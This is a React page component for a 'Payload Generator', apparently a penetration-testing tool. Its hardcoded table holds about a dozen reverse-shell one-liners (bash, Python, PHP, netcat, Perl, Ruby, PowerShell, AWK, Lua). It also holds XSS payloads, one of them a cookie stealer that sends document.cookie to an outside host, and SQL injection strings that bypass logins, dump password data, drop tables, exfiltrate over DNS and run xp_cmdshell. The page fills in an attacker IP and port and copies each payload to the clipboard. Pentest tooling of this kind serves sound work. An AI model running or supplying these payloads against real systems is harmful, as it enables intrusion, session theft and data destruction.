"use client";

import { useState, useCallback, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Navbar from "@/components/Navbar";
import SearchButton from "@/components/SearchButton";
import { TYPOGRAPHY } from "@/lib/design-tokens";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCopy, faCheck, faTerminal, faGlobe, faDatabase, faSearch } from "@fortawesome/free-solid-svg-icons";

type Category = "Shells" | "XSS" | "SQLi";

const CAT_ICONS: Record<Category, typeof faTerminal> = { Shells: faTerminal, XSS: faGlobe, SQLi: faDatabase };

const PAYLOADS: Record<Category, { name: string; payload: string }[]> = {
  Shells: [
    { name: "Bash TCP", payload: "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1" },
    { name: "Python", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
    { name: "PHP", payload: "php -r '$sock=fsockopen(\"[IP]\",[PORT]);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    { name: "Netcat (OpenBSD)", payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f" },
    { name: "Netcat (GNU)", payload: "nc -e /bin/sh [IP] [PORT]" },
    { name: "Perl", payload: "perl -e 'use Socket;$i=\"[IP]\";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
    { name: "Ruby", payload: "ruby -rsocket -e'f=TCPSocket.open(\"[IP]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    { name: "PowerShell TCP", payload: "$c=New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()" },
    { name: "PowerShell Encode", payload: "powershell -nop -enc [BASE64]" },
    { name: "AWK", payload: "awk 'BEGIN{s=\"/inet/tcp/0/[IP]/[PORT]\";while(42){do{printf\"shell>\"|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!=\"exit\")}}' /dev/null" },
    { name: "Lua", payload: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('[IP]','[PORT]');os.execute('/bin/sh -i <&3 >&3 2>&3')\"" },
  ],
  XSS: [
    { name: "Basic Alert", payload: "<script>alert(1)</script>" },
    { name: "Img Onerror", payload: "<img src=x onerror=alert(1)>" },
    { name: "SVG Onload", payload: "<svg onload=alert(1)>" },
    { name: "Body Onload", payload: "<body onload=alert(1)>" },
    { name: "Iframe", payload: "<iframe src=javascript:alert(1)></iframe>" },
    { name: "Input Autofocus", payload: "<input autofocus onfocus=alert(1)>" },
    { name: "Details Open", payload: "<details open ontoggle=alert(1)>" },
    { name: "Cookie Stealer", payload: "<img src=x onerror=\"fetch('https://[IP]:[PORT]/?c='+document.cookie)\">" },
    { name: "Polyglot", payload: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>" },
    { name: "DOM via Hash", payload: "#\" onmouseover=\"alert(1)" },
    { name: "CSS Injection", payload: "<style>body{display:none !important}</style>" },
  ],
  SQLi: [
    { name: "Auth Bypass", payload: "' OR '1'='1' --" },
    { name: "Union Select", payload: "' UNION SELECT 1,2,3,4,5 --" },
    { name: "Union Database", payload: "' UNION SELECT 1,database(),3,4,5 --" },
    { name: "Union Tables (MySQL)", payload: "' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables --" },
    { name: "Time Blind", payload: "' AND IF(1=1, SLEEP(5), 0) --" },
    { name: "Boolean Blind", payload: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a" },
    { name: "Stacked Query", payload: "'; DROP TABLE users; --" },
    { name: "OOB DNS", payload: "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.[IP]\\\\test')); --" },
    { name: "Error-Based", payload: "' AND 1=CONVERT(int, @@version) --" },
    { name: "XP_CMDSHELL", payload: "'; EXEC xp_cmdshell 'ping [IP]'; --" },
    { name: "NoSQL Injection", payload: '{"$gt": ""}' },
  ],
};

export default function PayloadGenerator() {
  const [cat, setCat] = useState<Category>("Shells");
  const [ip, setIp] = useState(() => typeof window !== "undefined" ? (localStorage.getItem("payload_ip") ?? "10.10.14.5") : "10.10.14.5");
  const [port, setPort] = useState(() => typeof window !== "undefined" ? (localStorage.getItem("payload_port") ?? "4444") : "4444");
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
  const [search, setSearch] = useState("");

  useEffect(() => { localStorage.setItem("payload_ip", ip); }, [ip]);
  useEffect(() => { localStorage.setItem("payload_port", port); }, [port]);

  const handleCopy = useCallback((payload: string, index: number) => {
    navigator.clipboard.writeText(payload.replace(/\[IP\]/g, ip).replace(/\[PORT\]/g, port));
    setCopiedIndex(index);
    setTimeout(() => setCopiedIndex(null), 1500);
  }, [ip, port]);

  const filtered = search
    ? PAYLOADS[cat].filter(p => p.name.toLowerCase().includes(search.toLowerCase()) || p.payload.toLowerCase().includes(search.toLowerCase()))
    : PAYLOADS[cat];

  return (
    <>
      <Navbar />
      <main className="flex-1 pt-16">
        <section className="relative w-full min-h-screen py-16 md:py-24 bg-surface">
          <div className="max-w-5xl mx-auto px-6 md:px-12">
            <h1 className="font-display text-3xl md:text-5xl font-extrabold uppercase text-fg mb-8" style={{ fontFamily: TYPOGRAPHY.fontDisplay }}>Payload Generator</h1>

            {/* Attacker config — all in one row */}
            <div className="flex flex-wrap items-center gap-3 mb-6 bg-surface p-4 border-2 border-fg">
              <label className="font-mono text-2xs uppercase tracking-widest text-fg-muted flex items-center gap-1.5" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                <span className="w-2 h-2 inline-block" style={{ backgroundColor: "#00ff44" }} /> LHOST
              </label>
              <input value={ip} onChange={e => setIp(e.target.value)} className="font-mono text-sm px-3 py-1.5 border-2 border-fg w-36 bg-surface text-fg focus:outline-none focus:border-green-400" style={{ fontFamily: TYPOGRAPHY.fontMono }} />
              <label className="font-mono text-2xs uppercase tracking-widest text-fg-muted flex items-center gap-1.5" style={{ fontFamily: TYPOGRAPHY.fontMono }}>
                <span className="w-2 h-2 inline-block" style={{ backgroundColor: "#ff2d95" }} /> LPORT
              </label>
              <input value={port} onChange={e => setPort(e.target.value)} className="font-mono text-sm px-3 py-1.5 border-2 border-fg w-24 bg-surface text-fg focus:outline-none focus:border-pink-400" style={{ fontFamily: TYPOGRAPHY.fontMono }} />
              <div className="flex-1" />
              <label className="font-mono text-2xs uppercase tracking-widest text-fg-muted" style={{ fontFamily: TYPOGRAPHY.fontMono }}><FontAwesomeIcon icon={faSearch} /></label>
              <input value={search} onChange={e => setSearch(e.target.value)} placeholder="filter..." className="font-mono text-sm px-3 py-1.5 border-2 border-fg w-40 bg-surface text-fg focus:outline-none" style={{ fontFamily: TYPOGRAPHY.fontMono }} />
            </div>

            {/* Category tabs */}
            <div className="flex gap-1.5 mb-6 flex-wrap">
              {(Object.keys(PAYLOADS) as Category[]).map(c => (
                <button
                  key={c}
                  onClick={() => { setCat(c); setSearch(""); }}
                  className={`font-mono text-xs uppercase px-4 py-2 border-2 cursor-pointer transition-colors flex items-center gap-2 ${cat === c ? "bg-fg text-surface border-fg" : "bg-surface text-fg-muted border-fg-muted hover:border-fg hover:text-fg"}`}
                  style={{ fontFamily: TYPOGRAPHY.fontMono }}
                >
                  <FontAwesomeIcon icon={CAT_ICONS[c]} /> {c} ({PAYLOADS[c].length})
                </button>
              ))}
            </div>

            {/* Payload list — simple bordered cards */}
            <div className="space-y-1.5">
              <AnimatePresence mode="popLayout">
                {filtered.map((p, i) => (
                  <motion.div
                    key={p.name}
                    initial={{ opacity: 0, y: 6 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    transition={{ delay: i * 0.015 }}
                    className="border-2 border-fg bg-surface hover:shadow-brutal-sm transition-shadow"
                  >
                    <div className="flex items-start gap-0" style={{ backgroundColor: "var(--surf)" }}>
                      <div className="shrink-0 w-40 px-3 py-2 border-r-2" style={{ borderColor: "var(--fg)" }}>
                        <div className="font-display text-xs font-bold uppercase" style={{ fontFamily: TYPOGRAPHY.fontDisplay, color: "var(--fg)" }}>{p.name}</div>
                      </div>
                      <code className="flex-1 font-mono text-xs px-3 py-2 break-all self-center" style={{ fontFamily: TYPOGRAPHY.fontMono, color: "var(--fg)" }}>
                        {p.payload.replace(/\[IP\]/g, ip).replace(/\[PORT\]/g, port)}
                      </code>
                      <button
                        onClick={() => handleCopy(p.payload, i)}
                        className="shrink-0 px-3 py-2 border-l-2 font-mono text-2xs uppercase hover:text-surface transition-colors cursor-pointer flex items-center gap-1.5"
                        style={{ fontFamily: TYPOGRAPHY.fontMono, borderColor: "var(--fg)", color: copiedIndex === i ? "#00dd44" : "var(--fg)" }}
                      >
                        <FontAwesomeIcon icon={copiedIndex === i ? faCheck : faCopy} />
                        {copiedIndex === i ? "DONE" : "COPY"}
                      </button>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
        </section>
      </main>
      <SearchButton />
    </>
  );
}
